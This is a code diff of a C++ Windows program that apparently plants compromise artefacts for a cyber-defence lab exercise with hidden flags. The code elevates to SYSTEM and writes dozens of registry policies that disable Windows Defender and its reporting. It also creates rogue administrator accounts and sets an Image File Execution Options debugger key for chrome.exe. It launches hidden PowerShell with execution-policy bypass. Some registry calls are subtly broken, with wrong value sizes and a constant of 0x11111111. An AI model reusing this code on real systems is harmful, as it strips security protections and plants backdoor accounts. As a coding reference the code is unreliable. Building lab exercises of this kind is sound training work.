@@ -4,10 +4,6 @@
 #include <TlHelp32.h>
 #include <lmcons.h>
 #include <lmaccess.h>
-// #include <lmerr.h>
-// #include <lmapibuf.h>
-// #include <stdio.h>
-// #include <stdlib.h>
 #include "../include/lab6.h"
 
 #pragma comment(lib, "netapi32.lib")
@@ -17,23 +13,16 @@
 namespace lab6 {
 
 // constants for the flags
-const char* kFlagPrefix = "ACDLAB6{";
-const char* kBadAdminFlag = "Never_should_have_come_here}";
-const char* kImageFileExecFlag = "Can't_touch_this}";
-const char* kFirewallFlag = "They_took_down_our_shields!}";
-const char* kCurrentVersionRunFlag = "Autobots_roll_out}";
-const char* kSSHFlag = "I_think_this_is_the_wrong_OS}";
-const char* kNetcatFlag = "Nyancat_bootloader_time}";
-const char* kSpawnedCMDFlag = "Hey_you_shouldn't_be_running_there}";
-const char* kInstalledServiceFlag = "Definitely_a_legit_service}";
-const char* kTaskSchedulerFlag = "Wanna_see_me_run_it_again}";
-
-// // names of the bad admin users
-// const char* kBadAdminName1 = "Spongebob";
-// const char* kBadAdminName2 = "Patrick";
-// const char* kBadAdminName3 = "Mr. Krabs";
-// const char* kBadAdminName4 = "Sandy";
-// const char* kBadAdminName5 = "Plankton";
+// const char* kFlagPrefix = "ACDLAB6{";
+// const char* kBadAdminFlag = "Never_should_have_come_here}";
+// const char* kImageFileExecFlag = "Can't_touch_this}";
+// const char* kFirewallFlag = "They_took_down_our_shields!}";
+// const char* kCurrentVersionRunFlag = "Autobots_roll_out}";
+// const char* kSSHFlag = "I_think_this_is_the_wrong_OS}";
+// const char* kNetcatFlag = "Nyancat_bootloader_time}";
+// const char* kSpawnedCMDFlag = "Hey_you_shouldn't_be_running_there}";
+// const char* kInstalledServiceFlag = "Definitely_a_legit_service}";
+// const char* kTaskSchedulerFlag = "Wanna_see_me_run_it_again}";
 
 std::string EnableDebugPrivs() {
     HANDLE hToken;
@@ -203,7 +192,7 @@ std::string CheckCurrentUsername() {
 }
 
 std::string DestroyDefender() {
-    DWORD one = 1;
+    DWORD one = 0x11111111;
     DWORD zero = 0;
     HKEY hkResult;
     DWORD dwDisposition;
@@ -219,32 +208,32 @@ std::string DestroyDefender() {
         std::cout << "REG_OPENED_EXISTING_KEY" << std::endl;
     }
     // "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" "DisableAntiSpyware" 1
-    retVal = RegSetValueExA(hkResult, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&one, 1);
+    retVal = RegSetValueEx(hkResult, TEXT("DisableAntiSpyware"), 0, REG_DWORD, (const BYTE*)&one, sizeof(one));
     if (retVal != ERROR_SUCCESS) {
         std::cout << "RegSetValueExA A1 failed with retVal: " << retVal << std::endl;
     }
     // HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1
-    retVal = RegSetValueExA(hkResult, "DisableRoutinelyTakingAction", 0, REG_DWORD, (const BYTE*)&one, 1);
+    retVal = RegSetValueExA(hkResult, "DisableRoutinelyTakingAction", 0, REG_DWORD, (BYTE*)&one, sizeof(one));
     if (retVal != ERROR_SUCCESS) {
         std::cout << "RegSetValueExA A2 failed with retVal: " << retVal << std::endl;
     }
     // "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1
-    retVal = RegSetValueExA(hkResult, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&one, 1);
+    retVal = RegSetValueExA(hkResult, "DisableRealtimeMonitoring", 0, REG_DWORD, (BYTE*)&one, sizeof(one));
     if (retVal != ERROR_SUCCESS) {
         std::cout << "RegSetValueExA A3 failed with retVal: " << retVal << std::endl;
     }
     // "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -Value 1
-    retVal = RegSetValueExA(hkResult, "DisableAntiVirus", 0, REG_DWORD, (const BYTE*)&one, 1);
+    retVal = RegSetValueExA(hkResult, "DisableAntiVirus", 0, REG_DWORD, (BYTE*)&one, sizeof(one));
     if (retVal != ERROR_SUCCESS) {
         std::cout << "RegSetValueExA A4 failed with retVal: " << retVal << std::endl;
     }
     // "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableSpecialRunningModes" -Value 1
-    retVal = RegSetValueExA(hkResult, "DisableSpecialRunningModes", 0, REG_DWORD, (const BYTE*)&one, 1);
+    retVal = RegSetValueExA(hkResult, "DisableSpecialRunningModes", 0, REG_DWORD, (BYTE*)&one, sizeof(one));
     if (retVal != ERROR_SUCCESS) {
         std::cout << "RegSetValueExA A5 failed with retVal: " << retVal << std::endl;
     }
     // "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "ServiceKeepAlive" -Value 0
-    retVal = RegSetValueExA(hkResult, "ServiceKeepAlive", 0, REG_DWORD, (const BYTE*)&zero, 1);
+    retVal = RegSetValueExA(hkResult, "ServiceKeepAlive", 0, REG_DWORD, (BYTE*)&zero, sizeof(one));
     if (retVal != ERROR_SUCCESS) {
         std::cout << "RegSetValueExA A6 failed with retVal: " << retVal << std::endl;
     }
@@ -260,32 +249,32 @@ std::string DestroyDefender() {
         std::cout << "REG_OPENED_EXISTING_KEY" << std::endl;
     }
     // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1
-    retVal = RegSetValueExA(hkResult, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&one, 1);
+    retVal = RegSetValueExA(hkResult, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&one, 1);
     if (retVal != ERROR_SUCCESS) {
         std::cout << "RegSetValueExA B1 failed with retVal: " << retVal << std::endl;
     }
     // HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1
-    retVal = RegSetValueExA(hkResult, "DisableRoutinelyTakingAction", 0, REG_DWORD, (const BYTE*)&one, 1);
+    retVal = RegSetValueExA(hkResult, "DisableRoutinelyTakingAction", 0, REG_DWORD, (BYTE*)&one, 1);
     if (retVal != ERROR_SUCCESS) {
         std::cout << "RegSetValueExA B2 failed with retVal: " << retVal << std::endl;
     }
     // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1
-    retVal = RegSetValueExA(hkResult, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&one, 1);
+    retVal = RegSetValueExA(hkResult, "DisableRealtimeMonitoring", 0, REG_DWORD, (BYTE*)&one, 1);
     if (retVal != ERROR_SUCCESS) {
         std::cout << "RegSetValueExA B3 failed with retVal: " << retVal << std::endl;
     }
     // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -Value 1
-    retVal = RegSetValueExA(hkResult, "DisableAntiVirus", 0, REG_DWORD, (const BYTE*)&one, 1);
+    retVal = RegSetValueExA(hkResult, "DisableAntiVirus", 0, REG_DWORD, (BYTE*)&one, 1);
     if (retVal != ERROR_SUCCESS) {
         std::cout << "RegSetValueExA B4 failed with retVal: " << retVal << std::endl;
     }
     // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableSpecialRunningModes" -Value 1
-    retVal = RegSetValueExA(hkResult, "DisableSpecialRunningModes", 0, REG_DWORD, (const BYTE*)&one, 1);
+    retVal = RegSetValueExA(hkResult, "DisableSpecialRunningModes", 0, REG_DWORD, (BYTE*)&one, 1);
     if (retVal != ERROR_SUCCESS) {
         std::cout << "RegSetValueExA B5 failed with retVal: " << retVal << std::endl;
     }
     // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "ServiceKeepAlive" -Value 0
-    retVal = RegSetValueExA(hkResult, "ServiceKeepAlive", 0, REG_DWORD, (const BYTE*)&zero, 1);
+    retVal = RegSetValueExA(hkResult, "ServiceKeepAlive", 0, REG_DWORD, (BYTE*)&zero, 1);
     if (retVal != ERROR_SUCCESS) {
         std::cout << "RegSetValueExA B6 failed with retVal: " << retVal << std::endl;
     }
@@ -301,17 +290,17 @@ std::string DestroyDefender() {
         std::cout << "REG_OPENED_EXISTING_KEY" << std::endl;
     }
     // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SpyNetReporting" -Value 0
-    retVal = RegSetValueExA(hkResult, "SpyNetReporting", 0, REG_DWORD, (const BYTE*)&zero, 1);
+    retVal = RegSetValueExA(hkResult, "SpyNetReporting", 0, REG_DWORD, (BYTE*)&zero, 1);
     if (retVal != ERROR_SUCCESS) {
         std::cout << "RegSetValueExA C1 failed with retVal: " << retVal << std::endl;
     }
     // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 0
-    retVal = RegSetValueExA(hkResult, "SubmitSamplesConsent", 0, REG_DWORD, (const BYTE*)&zero, 1);
+    retVal = RegSetValueExA(hkResult, "SubmitSamplesConsent", 0, REG_DWORD, (BYTE*)&zero, 1);
     if (retVal != ERROR_SUCCESS) {
         std::cout << "RegSetValueExA C2 failed with retVal: " << retVal << std::endl;
     }
     // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "DisableBlockAtFirstSeen" -Value 1
-    retVal = RegSetValueExA(hkResult, "DisableBlockAtFirstSeen", 0, REG_DWORD, (const BYTE*)&one, 1);
+    retVal = RegSetValueExA(hkResult, "DisableBlockAtFirstSeen", 0, REG_DWORD, (BYTE*)&one, 1);
     if (retVal != ERROR_SUCCESS) {
         std::cout << "RegSetValueExA C3 failed with retVal: " << retVal << std::endl;
     }
@@ -327,7 +316,7 @@ std::string DestroyDefender() {
         std::cout << "REG_OPENED_EXISTING_KEY" << std::endl;
     }
     // "HKLM:\SOFTWARE\Policies\Microsoft\MRT" -Name "DontReportInfectionInformation" -Value 1
-    retVal = RegSetValueExA(hkResult, "DontReportInfectionInformation", 0, REG_DWORD, (const BYTE*)&one, 1);
+    retVal = RegSetValueExA(hkResult, "DontReportInfectionInformation", 0, REG_DWORD, (BYTE*)&one, 1);
     if (retVal != ERROR_SUCCESS) {
         std::cout << "RegSetValueExA D1 failed with retVal: " << retVal << std::endl;
     }
@@ -343,7 +332,7 @@ std::string DestroyDefender() {
         std::cout << "REG_OPENED_EXISTING_KEY" << std::endl;
     }
     // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" -Name "ForceUpdateFromMU" -Value 0
-    retVal = RegSetValueExA(hkResult, "ForceUpdateFromMU", 0, REG_DWORD, (const BYTE*)&zero, 1);
+    retVal = RegSetValueExA(hkResult, "ForceUpdateFromMU", 0, REG_DWORD, (BYTE*)&zero, 1);
     if (retVal != ERROR_SUCCESS) {
         std::cout << "RegSetValueExA E1 failed with retVal: " << retVal << std::endl;
     }
@@ -359,22 +348,22 @@ std::string DestroyDefender() {
         std::cout << "REG_OPENED_EXISTING_KEY" << std::endl;
     }
     // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1
-    retVal = RegSetValueExA(hkResult, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&one, 1);
+    retVal = RegSetValueExA(hkResult, "DisableRealtimeMonitoring", 0, REG_DWORD, (BYTE*)&one, 1);
     if (retVal != ERROR_SUCCESS) {
         std::cout << "RegSetValueExA F1 failed with retVal: " << retVal << std::endl;
     }
     // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1
-    retVal = RegSetValueExA(hkResult, "DisableOnAccessProtection", 0, REG_DWORD, (const BYTE*)&one, 1);
+    retVal = RegSetValueExA(hkResult, "DisableOnAccessProtection", 0, REG_DWORD, (BYTE*)&one, 1);
     if (retVal != ERROR_SUCCESS) {
         std::cout << "RegSetValueExA F2 failed with retVal: " << retVal << std::endl;
     }
     // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1
-    retVal = RegSetValueExA(hkResult, "DisableBehaviorMonitoring", 0, REG_DWORD, (const BYTE*)&one, 1);
+    retVal = RegSetValueExA(hkResult, "DisableBehaviorMonitoring", 0, REG_DWORD, (BYTE*)&one, 1);
     if (retVal != ERROR_SUCCESS) {
         std::cout << "RegSetValueExA F3 failed with retVal: " << retVal << std::endl;
     }
     // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1
-    retVal = RegSetValueExA(hkResult, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (const BYTE*)&one, 1);
+    retVal = RegSetValueExA(hkResult, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (BYTE*)&one, 1);
     if (retVal != ERROR_SUCCESS) {
         std::cout << "RegSetValueExA F4 failed with retVal: " << retVal << std::endl;
     }
@@ -513,7 +502,7 @@ std::string AddImageFileExecutionOptionsKeys() {
         std::cout << "REG_OPENED_EXISTING_KEY" << std::endl;
     }
     // "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe" -Name "Debugger" -Value 0
-    retVal = RegSetValueExA(hkResult, "Debugger", 0, REG_DWORD, (const BYTE*)&zero, 1);
+    retVal = RegSetValueExA(hkResult, "Debugger", 0, REG_DWORD, (BYTE*)&zero, sizeof(zero));
     if (retVal != ERROR_SUCCESS) {
         std::cout << "RegSetValueExA failed with retVal: " << retVal << std::endl;
     }
@@ -559,9 +548,14 @@ int main (int argc, char *argv[]) {
     std::cout << "ElevateToSystem: " << lab6::ElevateToSystem() << std::endl;
     std::cout << "CheckCurrentUsername: " << lab6::CheckCurrentUsername() << std::endl;
     // need to test DestroyDefender on vm
-    // std::cout << "DestroyDefender: " << lab6::DestroyDefender() << std::endl;
-    // std::cout << "MakeBadAdmins: " << lab6::MakeBadAdmins() << std::endl;
+    std::cout << "DestroyDefender: " << lab6::DestroyDefender() << std::endl;
+    std::cout << "MakeBadAdmins: " << lab6::MakeBadAdmins() << std::endl;
     std::cout << "AddImageFileExecutionOptionsKeys: " << lab6::AddImageFileExecutionOptionsKeys() << std::endl;
+
+    ShellExecuteA(NULL, "runas", "powershell.exe -Exec ByPass -NoProfile -WindowStyle hidden -c \"IEX(echo test > test.txt)\"", NULL, NULL, SW_HIDE);
+
+    std::cout << "GetLastError: " << GetLastError() << std::endl;
+
     int x;
     std::cin >> x;
     return 0;
